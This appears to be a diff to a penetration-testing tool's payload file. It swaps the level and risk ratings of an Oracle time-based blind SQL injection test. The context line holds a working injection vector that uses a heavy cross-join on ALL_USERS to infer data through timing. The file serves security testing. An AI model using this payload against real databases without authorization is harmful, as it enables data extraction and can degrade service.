@@ -1760,8 +1760,8 @@ Formats:
     <test>
         <title>Oracle OR time-based blind (heavy query)</title>
         <stype>5</stype>
-        <level>3</level>
-        <risk>4</risk>
+        <level>4</level>
+        <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
         <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) ELSE [RANDNUM] END)</vector>
